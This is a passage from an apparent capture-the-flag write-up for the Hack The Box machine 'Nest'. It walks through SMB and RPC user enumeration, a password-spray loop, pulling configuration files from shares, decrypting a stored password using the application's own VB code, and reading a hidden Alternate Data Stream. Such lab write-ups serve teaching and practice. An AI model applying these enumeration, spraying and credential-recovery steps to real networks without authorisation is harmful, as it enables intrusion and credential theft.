</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls
</span></span><span class="line"><span class="cl">NT_STATUS_ACCESS_DENIED listing <span class="se">\F</span>inance<span class="se">\*</span>
</span></span><span class="line"><span class="cl">NT_STATUS_ACCESS_DENIED listing <span class="se">\H</span>R<span class="se">\*</span>
</span></span><span class="line"><span class="cl">NT_STATUS_ACCESS_DENIED listing <span class="se">\I</span>T<span class="se">\*</span>
</span></span></code></pre></div><p>On the other hand, I did a user enumeration using <code>rpcclient</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210416100040356.png" alt="image-20210416100040356"  /></div>
</p>
<p>With a little knowledge of scripting, I can filter the user.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «nest» «192.168.43.234»
</span></span><span class="line"><span class="cl">$  rpcclient -U <span class="s1">&#39;TempUser%welcome2019&#39;</span> -c <span class="s1">&#39;enumdomusers;quit&#39;</span> 10.10.10.178 <span class="p">|</span> tr -d <span class="s1">&#39;[]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f2 <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f1
</span></span><span class="line"><span class="cl">Administrator
</span></span><span class="line"><span class="cl">C.Smith
</span></span><span class="line"><span class="cl">Guest
</span></span><span class="line"><span class="cl">Service_HQK
</span></span><span class="line"><span class="cl">TempUser
</span></span></code></pre></div><p>I did a password spray using a simple bash script with a pattern of <code>username:username</code>, but no luck</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">for</span> u in <span class="sb">`</span>cat rpcusers.txt<span class="sb">`</span><span class="p">;</span> <span class="k">do</span> 
</span></span><span class="line"><span class="cl"> <span class="nb">echo</span> -n “<span class="o">[</span>*<span class="o">]</span> user : <span class="nv">$u</span> “ <span class="o">&amp;&amp;</span> 
</span></span><span class="line"><span class="cl"> rpcclient -U “<span class="nv">$u</span>%<span class="nv">$u</span>” -c “getusername<span class="p">;</span>quit” 10.10.10.178
</span></span><span class="line"><span class="cl"><span class="k">done</span>
</span></span></code></pre></div><p>I also check on users&rsquo; information to find a plain password in the description, but only end up knowing that the user flag is on <code>c.smith</code>.</p>
<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*7NAs7fNGkLwtNwZsGjTkRw.png" alt="img"  /></div>
</p>
<p>I went back to SMB, I decided to download all the content in the <code>Data</code> share.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «192.168.43.234»
</span></span><span class="line"><span class="cl">$ smbget -R smb://10.10.10.178/Data/ -U TempUser  <span class="c1"># or use mget * inside smbclient</span>
</span></span></code></pre></div><p>Here is the folder structure on <code>Data</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «Data» «192.168.43.234»
</span></span><span class="line"><span class="cl">$ tree
</span></span><span class="line"><span class="cl">.
</span></span><span class="line"><span class="cl">├── IT
</span></span><span class="line"><span class="cl">│   ├── Archive
</span></span><span class="line"><span class="cl">│   ├── Configs
</span></span><span class="line"><span class="cl">│   │   ├── Adobe
</span></span><span class="line"><span class="cl">│   │   │   ├── editing.xml
</span></span><span class="line"><span class="cl">│   │   │   ├── Options.txt
</span></span><span class="line"><span class="cl">│   │   │   ├── projects.xml
</span></span><span class="line"><span class="cl">│   │   │   └── settings.xml
</span></span><span class="line"><span class="cl">│   │   ├── Atlas
</span></span><span class="line"><span class="cl">│   │   │   └── Temp.XML
</span></span><span class="line"><span class="cl">│   │   ├── DLink
</span></span><span class="line"><span class="cl">│   │   ├── Microsoft
</span></span><span class="line"><span class="cl">│   │   │   └── Options.xml
</span></span><span class="line"><span class="cl">│   │   ├── NotepadPlusPlus
</span></span><span class="line"><span class="cl">│   │   │   ├── config.xml
</span></span><span class="line"><span class="cl">│   │   │   └── shortcuts.xml
</span></span><span class="line"><span class="cl">│   │   ├── RU Scanner
</span></span><span class="line"><span class="cl">│   │   │   └── RU_config.xml
</span></span><span class="line"><span class="cl">│   │   └── Server Manager
</span></span><span class="line"><span class="cl">│   ├── Installs
</span></span><span class="line"><span class="cl">│   ├── Reports
</span></span><span class="line"><span class="cl">│   └── Tools
</span></span><span class="line"><span class="cl">├── Production
</span></span><span class="line"><span class="cl">├── Reports
</span></span><span class="line"><span class="cl">└── Shared
</span></span><span class="line"><span class="cl">    ├── Maintenance
</span></span><span class="line"><span class="cl">    │   └── Maintenance Alerts.txt
</span></span><span class="line"><span class="cl">    └── Templates
</span></span><span class="line"><span class="cl">        ├── HR
</span></span><span class="line"><span class="cl">        │   └── Welcome Email.txt
</span></span><span class="line"><span class="cl">        └── Marketing
</span></span></code></pre></div><p>Notepad++ config on <code>Data/IT/Configs/NotepadPlusPlus/config.xml</code> contains interesting path.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">...[SNIP]...
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;History</span> <span class="na">nbMaxFile=</span><span class="s">&#34;15&#34;</span> <span class="na">inSubMenu=</span><span class="s">&#34;no&#34;</span> <span class="na">customLength=</span><span class="s">&#34;-1&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;File</span> <span class="na">filename=</span><span class="s">&#34;C:\windows\System32\drivers\etc\hosts&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;File</span> <span class="na">filename=</span><span class="s">&#34;\\HTB-NEST\Secure$\IT\Carl\Temp.txt&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;File</span> <span class="na">filename=</span><span class="s">&#34;C:\Users\C.Smith\Desktop\todo.txt&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/History&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/NotepadPlus&gt;</span>
</span></span></code></pre></div><p>In <code>/Data/IT/Configs/RU Scanner/RU_config.xml</code>, I found a pair credentials for user <code>c.smith</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">→ root@iamf «RU Scanner» «192.168.43.234»
</span></span><span class="line"><span class="cl">$ cat RU_config.xml
</span></span><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;ConfigFile</span> <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span class="na">xmlns:xsd=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;Port&gt;</span>389<span class="nt">&lt;/Port&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;Username&gt;</span>c.smith<span class="nt">&lt;/Username&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;Password&gt;</span>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=<span class="nt">&lt;/Password&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/ConfigFile&gt;</span>
</span></span></code></pre></div><p>At first glance, the password looks like a base64 encoded, but it is encrypted:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «RU Scanner» «192.168.43.234»
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&#39;</span> <span class="p">|</span> base64 -d
</span></span><span class="line"><span class="cl"><span class="o">}</span>13☺□♥□<span class="o">=</span>X□J□BA□↓☺X*□Wc□f□□□?βc◄
</span></span></code></pre></div><h4 id="secure-share">Secure$ share</h4>
<p>User carl doesn&rsquo;t appear on my enumeration with <code>rpcclient</code>, so after discovering this path <code>\\HTB-NEST\Secure$\IT\Carl\</code>, I went back to <code>Secure$</code> share and performed a recursive download there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «Data» «192.168.43.234»
</span></span><span class="line"><span class="cl">$ smbget -R smb://10.10.10.178/Secure$/IT/Carl/ -U TempUser
</span></span></code></pre></div><p>Here is the <code>Secure$</code> structure.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «Secure$» «192.168.43.234»
</span></span><span class="line"><span class="cl">$ tree
</span></span><span class="line"><span class="cl">.
</span></span><span class="line"><span class="cl">├── Docs
</span></span><span class="line"><span class="cl">│   ├── ip.txt
</span></span><span class="line"><span class="cl">│   └── mmc.txt
</span></span><span class="line"><span class="cl">├── Reports
</span></span><span class="line"><span class="cl">└── VB Projects
</span></span><span class="line"><span class="cl">    ├── Production
</span></span><span class="line"><span class="cl">    └── WIP
</span></span><span class="line"><span class="cl">        └── RU
</span></span><span class="line"><span class="cl">            ├── RUScanner
</span></span><span class="line"><span class="cl">            │   ├── bin
</span></span><span class="line"><span class="cl">            │   │   ├── Debug
</span></span><span class="line"><span class="cl">            │   │   └── Release
</span></span><span class="line"><span class="cl">            │   ├── ConfigFile.vb
</span></span><span class="line"><span class="cl">            │   ├── Module1.vb
</span></span><span class="line"><span class="cl">            │   ├── My Project
</span></span><span class="line"><span class="cl">            │   │   ├── Application.Designer.vb
</span></span><span class="line"><span class="cl">            │   │   ├── Application.myapp
</span></span><span class="line"><span class="cl">            │   │   ├── AssemblyInfo.vb
</span></span><span class="line"><span class="cl">            │   │   ├── Resources.Designer.vb
</span></span><span class="line"><span class="cl">            │   │   ├── Resources.resx
</span></span><span class="line"><span class="cl">            │   │   ├── Settings.Designer.vb
</span></span><span class="line"><span class="cl">            │   │   └── Settings.settings
</span></span><span class="line"><span class="cl">            │   ├── obj
</span></span><span class="line"><span class="cl">            │   │   └── x86
</span></span><span class="line"><span class="cl">            │   ├── RU Scanner.vbproj
</span></span><span class="line"><span class="cl">            │   ├── RU Scanner.vbproj.user
</span></span><span class="line"><span class="cl">            │   ├── SsoIntegration.vb
</span></span><span class="line"><span class="cl">            │   └── Utils.vb
</span></span><span class="line"><span class="cl">            └── RUScanner.sln
</span></span></code></pre></div><p>I just downloaded a whole VB Project!</p>
<p>Based on <code>Module1.vb</code>&rsquo;s content, <code>RU_config.xml</code> is loaded to the application, and from this line <code>.Password = Utils.DecryptString(Config.Password)</code>, I know this application is able to decrypt <code>c.smith</code>&rsquo;s password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-vb" data-lang="vb"><span class="line"><span class="cl"><span class="err">→</span> <span class="n">root</span><span class="err">@</span><span class="n">iamf</span> <span class="err">«</span><span class="n">WIP</span><span class="err">»</span> <span class="err">«</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">43</span><span class="p">.</span><span class="n">234</span><span class="err">»</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span> <span class="n">cat</span> <span class="n">RU</span><span class="o">/</span><span class="n">RUScanner</span><span class="o">/</span><span class="n">Module1</span><span class="p">.</span><span class="n">vb</span>
</span></span><span class="line"><span class="cl"><span class="k">Module</span> <span class="nn">Module1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">Sub</span> <span class="nf">Main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">Dim</span> <span class="n">Config</span> <span class="ow">As</span> <span class="n">ConfigFile</span> <span class="o">=</span> <span class="n">ConfigFile</span><span class="p">.</span><span class="n">LoadFromFile</span><span class="p">(</span><span class="s">&#34;RU_Config.xml&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">Dim</span> <span class="n">test</span> <span class="ow">As</span> <span class="k">New</span> <span class="n">SsoIntegration</span> <span class="k">With</span> <span class="p">{.</span><span class="n">Username</span> <span class="o">=</span> <span class="n">Config</span><span class="p">.</span><span class="n">Username</span><span class="p">,</span> <span class="p">.</span><span class="n">Password</span> <span class="o">=</span> <span class="n">Utils</span><span class="p">.</span><span class="n">DecryptString</span><span class="p">(</span><span class="n">Config</span><span class="p">.</span><span class="n">Password</span><span class="p">)}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">End</span> <span class="k">Sub</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">End</span> <span class="k">Module</span>
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="access-as-csmith">Access as c.smith</h3>
<h4 id="decrypting-csmith-password">Decrypting c.smith password</h4>
<p>The encrypted password can be decrypted easily by taking out the utils class and the decrypt function from <code>Utils.vb</code>, then call it on the main function. I used <a href="https://dotnetfiddle.net/">https://dotnetfiddle.net/</a> for this.</p>
<p>Here is how it looks like.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-vb" data-lang="vb"><span class="line"><span class="cl"><span class="k">Imports</span> <span class="nn">System</span>
</span></span><span class="line"><span class="cl"><span class="k">Imports</span> <span class="nn">System.Text</span>
</span></span><span class="line"><span class="cl"><span class="k">Imports</span> <span class="nn">System.Security.Cryptography</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">Public</span> <span class="k">Module</span> <span class="nn">Module1</span>
</span></span><span class="line"><span class="cl">	<span class="k">Public</span> <span class="k">Sub</span> <span class="nf">Main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">		<span class="k">Dim</span> <span class="n">encryptedPassword</span>
</span></span><span class="line"><span class="cl">		<span class="n">encryptedPassword</span> <span class="o">=</span> <span class="s">&#34;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Decrypted Password: &#34;</span> <span class="o">+</span><span class="n">Utils</span><span class="p">.</span><span class="n">DecryptString</span><span class="p">(</span><span class="n">encryptedPassword</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="k">End</span> <span class="k">Sub</span>
</span></span><span class="line"><span class="cl"><span class="k">End</span> <span class="k">Module</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">Public</span> <span class="k">Class</span> <span class="nc">Utils</span>
</span></span><span class="line"><span class="cl">    <span class="k">Public</span> <span class="k">Shared</span> <span class="k">Function</span> <span class="nf">DecryptString</span><span class="p">(</span><span class="n">EncryptedString</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">)</span> <span class="ow">As</span> <span class="kt">String</span>
</span></span><span class="line"><span class="cl">        <span class="k">If</span> <span class="kt">String</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="n">EncryptedString</span><span class="p">)</span> <span class="k">Then</span>
</span></span><span class="line"><span class="cl">            <span class="k">Return</span> <span class="kt">String</span><span class="p">.</span><span class="n">Empty</span>
</span></span><span class="line"><span class="cl">        <span class="k">Else</span>
</span></span><span class="line"><span class="cl">            <span class="k">Return</span> <span class="n">Decrypt</span><span class="p">(</span><span class="n">EncryptedString</span><span class="p">,</span> <span class="s">&#34;N3st22&#34;</span><span class="p">,</span> <span class="s">&#34;88552299&#34;</span><span class="p">,</span> <span class="n">2</span><span class="p">,</span> <span class="s">&#34;464R5DFA5DL6LE28&#34;</span><span class="p">,</span> <span class="n">256</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">End</span> <span class="k">If</span>
</span></span><span class="line"><span class="cl">    <span class="k">End</span> <span class="k">Function</span>
</span></span><span class="line"><span class="cl">    <span class="k">Public</span> <span class="k">Shared</span> <span class="k">Function</span> <span class="nf">Decrypt</span><span class="p">(</span><span class="k">ByVal</span> <span class="n">cipherText</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> _
</span></span><span class="line"><span class="cl">                                   <span class="k">ByVal</span> <span class="n">passPhrase</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> _
</span></span><span class="line"><span class="cl">                                   <span class="k">ByVal</span> <span class="n">saltValue</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> _
</span></span><span class="line"><span class="cl">                                    <span class="k">ByVal</span> <span class="n">passwordIterations</span> <span class="ow">As</span> <span class="kt">Integer</span><span class="p">,</span> _
</span></span><span class="line"><span class="cl">                                   <span class="k">ByVal</span> <span class="n">initVector</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> _
</span></span><span class="line"><span class="cl">                                   <span class="k">ByVal</span> <span class="n">keySize</span> <span class="ow">As</span> <span class="kt">Integer</span><span class="p">)</span> _
</span></span><span class="line"><span class="cl">                           <span class="ow">As</span> <span class="kt">String</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">Dim</span> <span class="n">initVectorBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">initVectorBytes</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">initVector</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">Dim</span> <span class="n">saltValueBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">saltValueBytes</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">saltValue</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">Dim</span> <span class="n">cipherTextBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">cipherTextBytes</span> <span class="o">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">cipherText</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">Dim</span> <span class="n">password</span> <span class="ow">As</span> <span class="k">New</span> <span class="n">Rfc2898DeriveBytes</span><span class="p">(</span><span class="n">passPhrase</span><span class="p">,</span> _
</span></span><span class="line"><span class="cl">                                           <span class="n">saltValueBytes</span><span class="p">,</span> _
</span></span><span class="line"><span class="cl">                                           <span class="n">passwordIterations</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">Dim</span> <span class="n">keyBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">keyBytes</span> <span class="o">=</span> <span class="n">password</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="k">CInt</span><span class="p">(</span><span class="n">keySize</span> <span class="o">/</span> <span class="n">8</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">Dim</span> <span class="n">symmetricKey</span> <span class="ow">As</span> <span class="k">New</span> <span class="n">AesCryptoServiceProvider</span>
</span></span><span class="line"><span class="cl">        <span class="n">symmetricKey</span><span class="p">.</span><span class="n">Mode</span> <span class="o">=</span> <span class="n">CipherMode</span><span class="p">.</span><span class="n">CBC</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">Dim</span> <span class="n">decryptor</span> <span class="ow">As</span> <span class="n">ICryptoTransform</span>
</span></span><span class="line"><span class="cl">        <span class="n">decryptor</span> <span class="o">=</span> <span class="n">symmetricKey</span><span class="p">.</span><span class="n">CreateDecryptor</span><span class="p">(</span><span class="n">keyBytes</span><span class="p">,</span> <span class="n">initVectorBytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">Dim</span> <span class="n">memoryStream</span> <span class="ow">As</span> <span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span>
</span></span><span class="line"><span class="cl">        <span class="n">memoryStream</span> <span class="o">=</span> <span class="k">New</span> <span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">(</span><span class="n">cipherTextBytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">Dim</span> <span class="n">cryptoStream</span> <span class="ow">As</span> <span class="n">CryptoStream</span>
</span></span><span class="line"><span class="cl">        <span class="n">cryptoStream</span> <span class="o">=</span> <span class="k">New</span> <span class="n">CryptoStream</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">,</span> _
</span></span><span class="line"><span class="cl">                                        <span class="n">decryptor</span><span class="p">,</span> _
</span></span><span class="line"><span class="cl">                                        <span class="n">CryptoStreamMode</span><span class="p">.</span><span class="n">Read</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">Dim</span> <span class="n">plainTextBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">ReDim</span> <span class="n">plainTextBytes</span><span class="p">(</span><span class="n">cipherTextBytes</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">Dim</span> <span class="n">decryptedByteCount</span> <span class="ow">As</span> <span class="kt">Integer</span>
</span></span><span class="line"><span class="cl">        <span class="n">decryptedByteCount</span> <span class="o">=</span> <span class="n">cryptoStream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="n">plainTextBytes</span><span class="p">,</span> _
</span></span><span class="line"><span class="cl">                                               <span class="n">0</span><span class="p">,</span> _
</span></span><span class="line"><span class="cl">                                               <span class="n">plainTextBytes</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">memoryStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">cryptoStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">Dim</span> <span class="n">plainText</span> <span class="ow">As</span> <span class="kt">String</span>
</span></span><span class="line"><span class="cl">        <span class="n">plainText</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">plainTextBytes</span><span class="p">,</span> _
</span></span><span class="line"><span class="cl">                                            <span class="n">0</span><span class="p">,</span> _
</span></span><span class="line"><span class="cl">                                            <span class="n">decryptedByteCount</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">Return</span> <span class="n">plainText</span>
</span></span><span class="line"><span class="cl">    <span class="k">End</span> <span class="k">Function</span>
</span></span><span class="line"><span class="cl"><span class="k">End</span> <span class="k">Class</span>
</span></span></code></pre></div><p>Now I have <code>c.smith</code>&rsquo;s password: <code>xRxRxPANCAK3SxRxRx</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210416080029703.png" alt="image-20210416080029703"  /></div>
</p>
<h4 id="users-share">Users share</h4>
<p>With <code>c.smith</code> credentials, I do more enumeration on SMB. First, I&rsquo;ll look into the <code>c.smith</code> home directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «smb» «192.168.43.234»
</span></span><span class="line"><span class="cl">$ smbclient -U <span class="s1">&#39;c.smith%xRxRxPANCAK3SxRxRx&#39;</span> //10.10.10.178/Users 
</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: <span class="se">\C</span>.Smith<span class="se">\&gt;</span> dir
</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Sun Jan <span class="m">26</span> 02:21:44 <span class="m">2020</span>
</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Sun Jan <span class="m">26</span> 02:21:44 <span class="m">2020</span>
</span></span><span class="line"><span class="cl">  HQK Reporting                       D        <span class="m">0</span>  Thu Aug  <span class="m">8</span> 19:06:17 <span class="m">2019</span>
</span></span><span class="line"><span class="cl">  user.txt                            A       <span class="m">32</span>  Thu Aug  <span class="m">8</span> 19:05:24 <span class="m">2019</span>
</span></span></code></pre></div><p>I downloaded those files recursively to my machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «c.smith» «192.168.43.234»
</span></span><span class="line"><span class="cl">$ tree
</span></span><span class="line"><span class="cl">.
</span></span><span class="line"><span class="cl">├── HQK Reporting
</span></span><span class="line"><span class="cl">│   ├── AD Integration Module
</span></span><span class="line"><span class="cl">│   │   └── HqkLdap.exe
</span></span><span class="line"><span class="cl">│   ├── Debug Mode Password.txt
</span></span><span class="line"><span class="cl">│   └── HQK_Config_Backup.xml
</span></span><span class="line"><span class="cl">└── user.txt
</span></span></code></pre></div><p><code>user.txt</code> is the user flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «c.smith» «192.168.43.234»
</span></span><span class="line"><span class="cl">$ cat user.txt
</span></span><span class="line"><span class="cl">cf71b25404be5d84fd827e05f426e987
</span></span></code></pre></div><p><code>HQK_Config_Backup.xml</code> doesn&rsquo;t contains any useful information</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">→ root@iamf «c.smith» «192.168.43.234»
</span></span><span class="line"><span class="cl">$ cat HQK\ Reporting/HQK_Config_Backup.xml
</span></span><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;ServiceSettings</span> <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span class="na">xmlns:xsd=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;Port&gt;</span>4386<span class="nt">&lt;/Port&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;QueryDirectory&gt;</span>C:\Program Files\HQK\ALL QUERIES<span class="nt">&lt;/QueryDirectory&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/ServiceSettings&gt;</span>
</span></span></code></pre></div><p><code>Debug Mode Password.txt</code> is empty file. But when I thought it was empty, I asked a hint for this.</p>
<p>This file is embedded with Alternate Data Stream (ADS). By using the <code>allinfo</code> command on the SMB, I can see it contains another data stream, <code>Password:$Data</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210525005607779.png" alt="image-20210525005607779"  /></div>
</p>
<p>To get that stream, I can just append <code>:Password:$Data</code> at the end of the file name.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">smb: <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\&gt;</span> allinfo <span class="s2">&#34;Debug Mode Password.txt&#34;</span>
</span></span><span class="line"><span class="cl">altname: DEBUGM~1.TXT
</span></span><span class="line"><span class="cl">create_time:    Thu Aug  <span class="m">8</span> 07:06:12 PM <span class="m">2019</span> EDT
</span></span><span class="line"><span class="cl">access_time:    Thu Aug  <span class="m">8</span> 07:06:12 PM <span class="m">2019</span> EDT
</span></span><span class="line"><span class="cl">write_time:     Thu Aug  <span class="m">8</span> 07:08:17 PM <span class="m">2019</span> EDT
</span></span><span class="line"><span class="cl">change_time:    Thu Aug  <span class="m">8</span> 07:08:17 PM <span class="m">2019</span> EDT
</span></span><span class="line"><span class="cl">attributes: A <span class="o">(</span>20<span class="o">)</span>
</span></span><span class="line"><span class="cl">stream: <span class="o">[</span>::<span class="nv">$DATA</span><span class="o">]</span>, <span class="m">0</span> bytes
</span></span><span class="line"><span class="cl">stream: <span class="o">[</span>:Password:<span class="nv">$DATA</span><span class="o">]</span>, <span class="m">15</span> bytes
</span></span><span class="line"><span class="cl">smb: <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\&gt;</span> get <span class="s2">&#34;Debug Mode Password.txt&#34;</span>:Password:<span class="nv">$DATA</span>
</span></span><span class="line"><span class="cl">getting file <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\D</span>ebug Mode Password.txt:Password:<span class="nv">$DATA</span> of size <span class="m">15</span> as Debug Mode Password.txt:Password:<span class="nv">$DATA</span> <span class="o">(</span>0.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.0 KiloBytes/sec<span class="o">)</span>
</span></span></code></pre></div><p>Now I can use the <code>cat</code> command to see the file content.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «c.smith» «192.168.43.234»
